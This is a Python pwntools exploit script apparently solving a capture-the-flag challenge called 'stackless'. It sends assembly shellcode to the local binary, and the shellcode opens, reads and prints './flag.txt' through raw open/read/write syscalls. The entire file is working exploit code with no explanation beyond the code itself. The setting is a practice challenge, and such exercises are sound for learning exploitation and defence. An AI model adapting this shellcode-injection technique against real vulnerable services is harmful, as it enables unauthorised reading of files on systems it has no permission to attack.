#!/usr/bin/env python3

from pwn import *

exe = ELF('./stackless')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
brva 0x1833
'''

p = process('./stackless')
#p = gdb.debug('./stackless', gdbscript = script)
#debug()

shellc = """
lea rdi, [rip + flag]
mov rax, 2
syscall

mov rdi, rax
mov rsi, qword ptr fs:0x0
mov rdx, 0x100
mov rax, 0
syscall

mov rdi, 1
mov rax, 1
syscall

flag:
.string "./flag.txt"
"""

sla(b"length\n", f"{len(shellc)}".encode())
sa(b"Shellcode\n", asm(shellc))

p.interactive()
